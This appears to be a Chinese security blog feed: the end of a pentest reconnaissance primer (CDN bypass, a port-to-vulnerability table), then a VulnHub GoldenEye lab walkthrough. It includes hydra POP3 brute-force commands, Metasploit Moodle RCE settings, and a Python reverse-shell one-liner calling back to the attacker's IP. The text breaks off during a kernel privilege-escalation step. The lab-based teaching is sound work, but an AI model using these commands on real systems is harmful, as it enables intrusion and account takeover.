env</li><li>密钥泄露</li><li>监控系统</li><li>数据库</li><li>docker数据</li><li>history历史记录</li><li>地图api</li><li>swagger泄露</li><li>sourcemap反编译</li><li>ds文件泄露</li><li>物理绝对路径泄露</li><li>开发api文档泄露</li><li>xml文档树泄露</li><li>docker命令泄露</li></ul><h3 id="第四步-IP"><a href="#第四步-IP" class="headerlink" title="第四步:IP"></a>第四步:IP</h3><p>很多新手会忽略基于端口的渗透，事实上基于端口也有很多漏洞<br>[[端口渗透测试]]</p><h4 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h4><h5 id="CDN检测"><a href="#CDN检测" class="headerlink" title="CDN检测"></a>CDN检测</h5><p><a href="https://cdn.console.aliyun.com/tool/ipCheck">https://cdn.console.aliyun.com/tool/ipCheck</a></p><h5 id="CDN绕过"><a href="#CDN绕过" class="headerlink" title="CDN绕过"></a>CDN绕过</h5><p>​1.扫描网站泄露信息文件</p><p>​2.内部邮箱，一般邮件系统都在内部，没有经过CDN解析，ping邮件服务器的域名</p><p>​3.分站域名，很多网站主站挂了CDN，但是分站可能没有，可以通过二级域名获取分站ip，可能分站和主站不是同一个ip但是在同一个C段下面的情况，从而判断出</p><p>​4.国外访问，国内的CDN往往只对国内用户的访问加速</p><p>​5.查询域名的历史解析记录<a href="https://uptime.netcraft.com/">https://uptime.netcraft.com/</a></p><p>​6.目标网站如果有自己的APP，可以尝试抓APP数据包找真实ip  </p><p>​7.<a href="https://crt.sh/">https://crt.sh/</a></p><h4 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h4><h5 id="常见端口及其服务与常见漏洞"><a href="#常见端口及其服务与常见漏洞" class="headerlink" title="常见端口及其服务与常见漏洞"></a>常见端口及其服务与常见漏洞</h5><table><thead><tr><th>端口</th><th>服务</th><th>漏洞</th></tr></thead><tbody><tr><td>21&#x2F;69</td><td>FTP&#x2F;TFTP</td><td>弱口令, 匿名访问&#x2F;可写, 敏感信息泄露</td></tr><tr><td>22</td><td>SSH</td><td>弱口令, 远程执行, 后门植入</td></tr><tr><td>23</td><td>Telnet</td><td>弱口令，后门植入</td></tr><tr><td>25</td><td>SMTP</td><td>服务错误配置导致的用户名枚举漏洞, 弱口令, 敏感信息泄露</td></tr><tr><td>53</td><td>DNS</td><td>DNS域传送\DNS缓存投毒\DNS欺骗\利用DNS隧道技术刺透防火墙</td></tr><tr><td>110</td><td>POP3</td><td>弱口令, 敏感信息泄露</td></tr><tr><td>135</td><td>WMI</td><td>弱口令, 远程执行, 后门植入</td></tr><tr><td>143</td><td>IMAP</td><td>弱口令, 敏感信息泄露</td></tr><tr><td>389</td><td>LDAP</td><td>未授权访问, 弱口令, 敏感账号密码泄露</td></tr><tr><td>443</td><td>Exchange</td><td>接口弱口令爆破 eg: Owa,ews,oab,AutoDiscover… pth脱邮件, 敏感信息泄露</td></tr><tr><td>445</td><td>SMB</td><td>弱口令, 远程执行, 后门植入,ms17-010</td></tr><tr><td>873</td><td>Rsync</td><td>未授权, 弱口令, 敏感信息泄露</td></tr><tr><td>1090&#x2F;1099</td><td>JAVA RMI</td><td>反序列化</td></tr><tr><td>1433</td><td>Mysql</td><td>弱口令, 敏感账号密码泄露, 提权, 远程执行, 后门植入</td></tr><tr><td>1521</td><td>ORACLE</td><td>弱口令, 敏感账号密码泄露, 提权, 远程执行, 后门植入</td></tr><tr><td>2049</td><td>NFS</td><td>配置不当</td></tr><tr><td>2181</td><td>ZooKeeper</td><td>未授权访问</td></tr><tr><td>3306</td><td>Mysql</td><td>弱口令, 敏感账号密码泄露, 提权(只适用于部分老系统)</td></tr><tr><td>3389</td><td>RDP</td><td>弱口令, 远程执行, 别人留的shift类后门</td></tr><tr><td>3690</td><td>SVN</td><td>弱口令, 敏感信息泄露</td></tr><tr><td>4848</td><td>GlassFish</td><td>弱口令，认证绕过</td></tr><tr><td>5432</td><td>POSTGRESQL</td><td>弱口令, 敏感信息泄露</td></tr><tr><td>5900</td><td>VNC</td><td>弱口令</td></tr><tr><td>5984</td><td>CouchDB</td><td>未授权访问</td></tr><tr><td>5985</td><td>WinRM</td><td>此项主要针对某些高版本Windows, 弱口令, 远程执行, 后门植入</td></tr><tr><td>6379</td><td>REDIS</td><td>弱口令, 未授权访问, 写文件(webshell,启动项,计划任务), 提权</td></tr><tr><td>7001</td><td>weblogic</td><td>控制台弱口令+部署war包，反序列化</td></tr><tr><td>8848</td><td>nacos</td><td>弱口令，未授权访问，认证绕过，默认密钥(token.secret.key)身份伪造，sql注入，反序列化</td></tr><tr><td>27017</td><td>MongoDB</td><td>弱口令，未授权访问</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
      <tag>入门</tag>
      
      <tag>信息收集</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub靶场-Goldeneye</title>
    <link href="/2024/08/02/vulnhub%E9%9D%B6%E5%9C%BA-Goldeneye/"/>
    <url>/2024/08/02/vulnhub%E9%9D%B6%E5%9C%BA-Goldeneye/</url>
    
    <content type="html"><![CDATA[<h1 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h1><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408020014227.png"><br>可以看到开了四个端口，再通过nmap详细扫描<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408020019646.png" alt="image.png"></p><p>先打开网页看看<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408012352373.png" alt="image.png"><br>按照他给的目录去访问之后要求输入账号密码，尝试弱口令无果，我们去找哪里有账号密码<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408012357719.png" alt="image.png"><br>查看源代码，css一般是渲染文件，没听说过有漏洞存在，那我们只能去看这个js文件<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408012358864.png" alt="image.png"><br>根据以上内容可以看到网站主人叫<br>Boris<br>这很可能就是账号<br>然后有个I encoded you p@ssword below<br>尝试一下解码<br>结果是<br>InvincibleHack3r<br>拿着账号密码试试<br>最终得出账号&#x2F;密码是<br>boris&#x2F;InvincibleHack3r</p><h1 id="2-打点"><a href="#2-打点" class="headerlink" title="2.打点"></a>2.打点</h1><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408020013510.png" alt="image.png"><br>进入下一个界面<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408020020324.png" alt="image.png"><br>告诉我们接下来打pop3<br>根据我们刚才拿到的账号，对pop3进行连接</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">echo -e &#x27;boris\nnatalya&#x27; &gt; <span class="hljs-keyword">user</span><br><span class="hljs-title">hydra</span> -L ./<span class="hljs-keyword">user</span> <span class="hljs-title">-P</span> /usr/share/wordlists/fasttrack.txt <span class="hljs-number">192.168</span>.<span class="hljs-number">56.131</span> -s <span class="hljs-number">55007</span> pop3<br></code></pre></td></tr></table></figure><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408021058240.png" alt="image.png"><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408021059438.png" alt="image.png"><br>（我这里一开始首字母大小写都用上了，所以扫出Boris，后面了解到pop3是不区分大小写的，如果出现连接错误就再来一次）</p><table><thead><tr><th>user</th><th>pass</th></tr></thead><tbody><tr><td>Boris</td><td>secret1!</td></tr><tr><td>natalya</td><td>bird</td></tr><tr><td>拿到账号密码之后我们就可以开始进行连接</td><td></td></tr></tbody></table><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">nc <span class="hljs-number">192.168</span>.<span class="hljs-number">56.131</span> <span class="hljs-number">55007</span><br><span class="hljs-keyword">user</span> <span class="hljs-title">Boris</span><br>pass secret1!<br></code></pre></td></tr></table></figure><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408021101965.png" alt="image.png"><br>再通过list我们能看到3封邮件<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408021102748.png" alt="image.png"><br>使用retr命令看看内容<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408021105877.png" alt="image.png"></p><p>boris</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-number">1</span>.<br><span class="hljs-keyword">Return</span>-Path: &lt;root@<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>.goldeneye&gt;<br>X-Original-<span class="hljs-keyword">To</span>: boris<br>Delivered-<span class="hljs-keyword">To</span>: boris@ubuntu<br><span class="hljs-symbol">Received:</span> <span class="hljs-keyword">from</span> ok (localhost [<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>])<br>        <span class="hljs-keyword">by</span> ubuntu (Postfix) <span class="hljs-keyword">with</span> SMTP id D9E47454B1<br>        <span class="hljs-keyword">for</span> &lt;boris&gt;; Tue, <span class="hljs-number">2</span> Apr <span class="hljs-number">1990</span> <span class="hljs-number">19</span>:<span class="hljs-number">22</span>:<span class="hljs-number">14</span> -<span class="hljs-number">0700</span> (PDT)<br>Message-Id: &lt;<span class="hljs-number">20180425022326</span>.D9E47454B1@ubuntu&gt;<br><span class="hljs-symbol">Date:</span> Tue, <span class="hljs-number">2</span> Apr <span class="hljs-number">1990</span> <span class="hljs-number">19</span>:<span class="hljs-number">22</span>:<span class="hljs-number">14</span> -<span class="hljs-number">0700</span> (PDT)<br><span class="hljs-symbol">From:</span> root@<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>.goldeneye<br><br>Boris, this <span class="hljs-built_in">is</span> admin. You can electronically communicate <span class="hljs-keyword">to</span> co-workers <span class="hljs-built_in">and</span> students here. I<span class="hljs-comment">&#x27;m not going to scan emails for security risks because I trust you and the other admins here.</span><br>鲍里斯，我是管理员。你可以在这里与同事和学生进行电子交流。我不会扫描邮件的安全风险，因为我信任你和其他管理员。<br><span class="hljs-number">2</span>.<br><span class="hljs-keyword">Return</span>-Path: &lt;natalya@ubuntu&gt;<br>X-Original-<span class="hljs-keyword">To</span>: boris<br>Delivered-<span class="hljs-keyword">To</span>: boris@ubuntu<br><span class="hljs-symbol">Received:</span> <span class="hljs-keyword">from</span> ok (localhost [<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>])<br>        <span class="hljs-keyword">by</span> ubuntu (Postfix) <span class="hljs-keyword">with</span> ESMTP id C3F2B454B1<br>        <span class="hljs-keyword">for</span> &lt;boris&gt;; Tue, <span class="hljs-number">21</span> Apr <span class="hljs-number">1995</span> <span class="hljs-number">19</span>:<span class="hljs-number">42</span>:<span class="hljs-number">35</span> -<span class="hljs-number">0700</span> (PDT)<br>Message-Id: &lt;<span class="hljs-number">20180425024249</span>.C3F2B454B1@ubuntu&gt;<br><span class="hljs-symbol">Date:</span> Tue, <span class="hljs-number">21</span> Apr <span class="hljs-number">1995</span> <span class="hljs-number">19</span>:<span class="hljs-number">42</span>:<span class="hljs-number">35</span> -<span class="hljs-number">0700</span> (PDT)<br><span class="hljs-symbol">From:</span> natalya@ubuntu<br><br>Boris, I can break your codes!<br>鲍里斯，我能破解你的密码!<br><span class="hljs-number">3</span>.<br><span class="hljs-keyword">Return</span>-Path: &lt;alec@janus.boss&gt;<br>X-Original-<span class="hljs-keyword">To</span>: boris<br>Delivered-<span class="hljs-keyword">To</span>: boris@ubuntu<br><span class="hljs-symbol">Received:</span> <span class="hljs-keyword">from</span> janus (localhost [<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>])<br>        <span class="hljs-keyword">by</span> ubuntu (Postfix) <span class="hljs-keyword">with</span> ESMTP id <span class="hljs-number">4</span>B9F4454B1<br>        <span class="hljs-keyword">for</span> &lt;boris&gt;; Wed, <span class="hljs-number">22</span> Apr <span class="hljs-number">1995</span> <span class="hljs-number">19</span>:<span class="hljs-number">51</span>:<span class="hljs-number">48</span> -<span class="hljs-number">0700</span> (PDT)<br>Message-Id: &lt;<span class="hljs-number">20180425025235.4</span>B9F4454B1@ubuntu&gt;<br><span class="hljs-symbol">Date:</span> Wed, <span class="hljs-number">22</span> Apr <span class="hljs-number">1995</span> <span class="hljs-number">19</span>:<span class="hljs-number">51</span>:<span class="hljs-number">48</span> -<span class="hljs-number">0700</span> (PDT)<br><span class="hljs-symbol">From:</span> alec@janus.boss<br><br>Boris,<br><br>Your cooperation <span class="hljs-keyword">with</span> our syndicate will pay <span class="hljs-keyword">off</span> big. Attached are the final access codes <span class="hljs-keyword">for</span> GoldenEye. Place them <span class="hljs-keyword">in</span> a hidden file within the root directory <span class="hljs-keyword">of</span> this server <span class="hljs-keyword">then</span> remove <span class="hljs-keyword">from</span> this email. There can only be one <span class="hljs-keyword">set</span> <span class="hljs-keyword">of</span> these acces codes, <span class="hljs-built_in">and</span> we need <span class="hljs-keyword">to</span> secure them <span class="hljs-keyword">for</span> the final execution. <span class="hljs-keyword">If</span> they are retrieved <span class="hljs-built_in">and</span> captured our plan will crash <span class="hljs-built_in">and</span> burn!<br><br>Once Xenia gets access <span class="hljs-keyword">to</span> the training site <span class="hljs-built_in">and</span> becomes familiar <span class="hljs-keyword">with</span> the GoldenEye Terminal codes we will push <span class="hljs-keyword">to</span> our final stages....<br><br>PS - Keep security tight <span class="hljs-built_in">or</span> we will be compromised.<br>鲍里斯,<br>​<br>你和我们的辛迪加合作会有大回报的。附件是黄金眼的最终访问密码。把它们放在这个服务器根目录下的一个隐藏文件中，然后从这封电子邮件中删除。这些访问代码只能有一组，我们需要保护它们以便最终执行。如果他们被捕获，我们的计划就会崩溃!<br>​<br>一旦Xenia进入训练地点并熟悉黄金眼终端代码我们将进入最后阶段....<br>​<br>注意安全，否则我们会受到威胁。<br></code></pre></td></tr></table></figure><p>natalya</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-number">1</span>.<br><span class="hljs-keyword">Return</span>-Path: &lt;root@ubuntu&gt;<br>X-Original-<span class="hljs-keyword">To</span>: natalya<br>Delivered-<span class="hljs-keyword">To</span>: natalya@ubuntu<br><span class="hljs-symbol">Received:</span> <span class="hljs-keyword">from</span> ok (localhost [<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>])<br>        <span class="hljs-keyword">by</span> ubuntu (Postfix) <span class="hljs-keyword">with</span> ESMTP id D5EDA454B1<br>        <span class="hljs-keyword">for</span> &lt;natalya&gt;; Tue, <span class="hljs-number">10</span> Apr <span class="hljs-number">1995</span> <span class="hljs-number">19</span>:<span class="hljs-number">45</span>:<span class="hljs-number">33</span> -<span class="hljs-number">0700</span> (PDT)<br>Message-Id: &lt;<span class="hljs-number">20180425024542</span>.D5EDA454B1@ubuntu&gt;<br><span class="hljs-symbol">Date:</span> Tue, <span class="hljs-number">10</span> Apr <span class="hljs-number">1995</span> <span class="hljs-number">19</span>:<span class="hljs-number">45</span>:<span class="hljs-number">33</span> -<span class="hljs-number">0700</span> (PDT)<br><span class="hljs-symbol">From:</span> root@ubuntu<br><br>Natalya, please you need <span class="hljs-keyword">to</span> <span class="hljs-keyword">stop</span> breaking boris<span class="hljs-comment">&#x27; codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you.</span><br><br>Also, be cautious <span class="hljs-keyword">of</span> possible network breaches. We have intel that GoldenEye <span class="hljs-built_in">is</span> being sought after <span class="hljs-keyword">by</span> a crime syndicate named Janus.<br>娜塔莉亚，拜托你别再破坏鲍里斯的密码了。另外，你是培训主管。一旦有学生指定给你，我会发邮件给你。<br>​<br>此外，要小心可能的网络入侵。我们有情报说黄金眼正在被一个叫雅努斯的犯罪集团追杀。<br><span class="hljs-number">2</span>.<br><span class="hljs-keyword">Return</span>-Path: &lt;root@ubuntu&gt;<br>X-Original-<span class="hljs-keyword">To</span>: natalya<br>Delivered-<span class="hljs-keyword">To</span>: natalya@ubuntu<br><span class="hljs-symbol">Received:</span> <span class="hljs-keyword">from</span> root (localhost [<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>])<br>        <span class="hljs-keyword">by</span> ubuntu (Postfix) <span class="hljs-keyword">with</span> SMTP id <span class="hljs-number">17</span>C96454B1<br>        <span class="hljs-keyword">for</span> &lt;natalya&gt;; Tue, <span class="hljs-number">29</span> Apr <span class="hljs-number">1995</span> <span class="hljs-number">20</span>:<span class="hljs-number">19</span>:<span class="hljs-number">42</span> -<span class="hljs-number">0700</span> (PDT)<br>Message-Id: &lt;<span class="hljs-number">20180425031956.17</span>C96454B1@ubuntu&gt;<br><span class="hljs-symbol">Date:</span> Tue, <span class="hljs-number">29</span> Apr <span class="hljs-number">1995</span> <span class="hljs-number">20</span>:<span class="hljs-number">19</span>:<span class="hljs-number">42</span> -<span class="hljs-number">0700</span> (PDT)<br><span class="hljs-symbol">From:</span> root@ubuntu<br><br>Ok Natalyn I have a <span class="hljs-built_in">new</span> student <span class="hljs-keyword">for</span> you. <span class="hljs-keyword">As</span> this <span class="hljs-built_in">is</span> a <span class="hljs-built_in">new</span> system please <span class="hljs-keyword">let</span> <span class="hljs-keyword">me</span> <span class="hljs-built_in">or</span> boris know <span class="hljs-keyword">if</span> you see any config issues, especially <span class="hljs-built_in">is</span> it<span class="hljs-comment">&#x27;s related to security...even if it&#x27;s not, just enter it in under the guise of &quot;security&quot;...it&#x27;ll get the change order escalated without much hassle :)</span><br><br>Ok, user creds are:<br><br><span class="hljs-symbol">username:</span> xenia<br><span class="hljs-symbol">password:</span> RCP90rulez!<br><br>Boris verified her <span class="hljs-keyword">as</span> a valid contractor so just create the account ok?<br><br><span class="hljs-built_in">And</span> <span class="hljs-keyword">if</span> you didn<span class="hljs-comment">&#x27;t have the URL on outr internal Domain: severnaya-station.com/gnocertdir</span><br>**Make sure <span class="hljs-keyword">to</span> edit your host file since you usually work remote <span class="hljs-keyword">off</span>-network....<br><br>Since you<span class="hljs-comment">&#x27;re a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.</span><br><br>好的，娜塔莉，我给你介绍一个新学生。由于这是一个新系统，如果你看到任何配置问题，请告诉我或boris，特别是与安全有关的问题……即使不是，只要在“安全”的幌子下输入它……它会毫不费力地升级变更顺序:)<br>​<br>好的，用户信用是:<br>​<br>用户名:xenia<br>密码:RCP90rulez!<br>​<br>鲍里斯证实了她是合法的承包商所以只要创建账户，好吗?<br>如果你在外部内部域名上没有网址:severnaya-station.com/gnocertdir<br>**请确保编辑您的主机文件，因为您通常在网络外远程工作....<br>​<br>因为你是一个Linux用户，只要把这个服务器的IP指向/etc/hosts中的severnaya-station.com即可<br></code></pre></td></tr></table></figure><p>从上文我们可以知道，我们需要访问<br>severnaya-station.com&#x2F;gnocertdir<br>而且我们要在hosts里将ip指向severnaya-station.com<br>然后应该是通过他给的账号密码进行登录即可</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">echo <span class="hljs-string">&quot;192.168.56.131 severnaya-station.com&quot;</span> &gt;&gt; /etc/hosts<br><br>或者<br>vim /etc/hosts<br>i<br><span class="hljs-number">192.168.56.131</span> severnaya-station.com<br>:wq<br></code></pre></td></tr></table></figure><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408021119705.png" alt="image.png"><br>然后拿着账号密码登录，可以看到这是一个moodle为模板的网站<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408021123274.png" alt="image.png"></p><p>具体地说应该是moodle2.2.3，我们可以考虑用历史漏洞打<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408021129701.png" alt="image.png"><br>先继续翻我们在message里看到一个叫doak的用户，再爆破一下邮箱<br>&#96;&#96;<br><code>hydra -l doak -P /usr/share/wordlists/fasttrack.txt 192.168.56.131 -s 55007 pop3</code></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408021134298.png" alt="image.png"></p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-keyword">Return</span>-Path: &lt;doak@ubuntu&gt;<br>X-Original-<span class="hljs-keyword">To</span>: doak<br>Delivered-<span class="hljs-keyword">To</span>: doak@ubuntu<br><span class="hljs-symbol">Received:</span> <span class="hljs-keyword">from</span> doak (localhost [<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>])<br>        <span class="hljs-keyword">by</span> ubuntu (Postfix) <span class="hljs-keyword">with</span> SMTP id <span class="hljs-number">97</span>DC24549D<br>        <span class="hljs-keyword">for</span> &lt;doak&gt;; Tue, <span class="hljs-number">30</span> Apr <span class="hljs-number">1995</span> <span class="hljs-number">20</span>:<span class="hljs-number">47</span>:<span class="hljs-number">24</span> -<span class="hljs-number">0700</span> (PDT)<br>Message-Id: &lt;<span class="hljs-number">20180425034731.97D</span>C24549D@ubuntu&gt;<br><span class="hljs-symbol">Date:</span> Tue, <span class="hljs-number">30</span> Apr <span class="hljs-number">1995</span> <span class="hljs-number">20</span>:<span class="hljs-number">47</span>:<span class="hljs-number">24</span> -<span class="hljs-number">0700</span> (PDT)<br><span class="hljs-symbol">From:</span> doak@ubuntu<br><br>James,<br><span class="hljs-keyword">If</span> you<span class="hljs-comment">&#x27;re reading this, congrats you&#x27;ve gotten this far. You know how tradecraft works right?</span><br><br>Because I don<span class="hljs-comment">&#x27;t. Go to our training site and login to my account....dig until you can exfiltrate further information......</span><br><br><span class="hljs-symbol">username:</span> dr_doak<br><span class="hljs-symbol">password:</span> <span class="hljs-number">4</span>England!<br>詹姆斯,<br>如果你正在阅读这篇文章，恭喜你已经走到了这一步。你知道谍报技术是怎么运作的吧?<br>​<br>因为我不知道。去我们的培训网站，登陆我的账号....继续挖，直到你能获取更多信息......<br>​<br>用户名:dr_doak<br>密码:<span class="hljs-number">4</span>England!<br></code></pre></td></tr></table></figure><p>又是个账号密码，直接登录<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408021136809.png" alt="image.png"><br>看到右边有个forjames，打开看看<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408021137106.png" alt="image.png"><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408021139377.png" alt="image.png"><br>跟着指引访问得到一张图片<br>图片隐写，打过ctf应该都有各自的思路，这里直说了就在strings里<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408021140610.png" alt="image.png"><br>base64解码<br>xWinter1995x!<br>然后再换admin登录<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408021215447.png" alt="image.png"><br>admin看到的东西明显不同<br><a href="https://nvd.nist.gov/vuln/detail/CVE-2013-3630">NVD - CVE-2013-3630 (nist.gov)</a><br>这个就是moodle 2.2.3存在的漏洞<br><a href="https://www.exploit-db.com/exploits/29324">Moodle - Remote Command Execution (Metasploit) - Linux remote Exploit (exploit-db.com)</a><br>看看exp，看不懂就丢gpt<br>我们需要注意<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408021225070.png"><br>这里要PSpellShell，默认的是Google spell<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408021227096.png" alt="image.png"><br>使用msf反弹<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408021230247.png" alt="image.png"><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408021231951.png" alt="image.png"><br>我们用2013的那个<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408021232038.png" alt="image.png"></p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> password <span class="hljs-comment">xWinter1995x!</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">rhosts severnaya-station.com</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">targetui</span> /gnocertdir/<br></code></pre></td></tr></table></figure><p>这样就行，再加上payload<br><code>set payload cmd/unix/reverse</code><br><code>set lhost 172.29.61.154</code><br>然后看个人习惯，我喜欢1111端口监听，这里我把lport也改了<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408021247828.png" alt="image.png"><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408021247828.png"><br>成功getshell</p><hr><p>另一种getshell方式<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408021228833.png" alt="image.png"><br>这里有一个反弹语句，我们改成python反弹shell语句<br><code>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;172.29.61.154&quot;,6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/sh&quot;)&#39;</code><br>在这里触发<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408021310831.png" alt="image.png"><br>点一下就能反弹</p><hr><h1 id="3-提权"><a href="#3-提权" class="headerlink" title="3.提权"></a>3.提权</h1><p>我们这样的连接即不稳定，也不美观，我们整个完整交互shell<br>用which python看到有python，直接用<br><code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408021311750.png" alt="image.png"><br>提权信息收集</p><p>uname -a    显示全部系统信息</p><p>cat &#x2F;etc&#x2F;issue 内核信息。此命令也适用于所有的Linux发行版</p><p>cat &#x2F;etc&#x2F;passwd 所有人都可看</p><p>ps aux | grep root</p><p>这里我们就uname -a看到linux版本<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408021324758.png" alt="image.png"><br>3.13<br>我们找找这个版本有没有能内核提权的漏洞<br><a href="https://www.exploit-db.com/exploits/37292">Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04&#x2F;14.04&#x2F;14.10&#x2F;15.04) - ‘overlayfs’ Local Privilege Escalation - Linux local Exploit (exploit-db.com)</a><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408021327978.png" alt="image.png"><br>可以看到它是一个.c的文件，要通过gcc编译<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202408021328095.png" 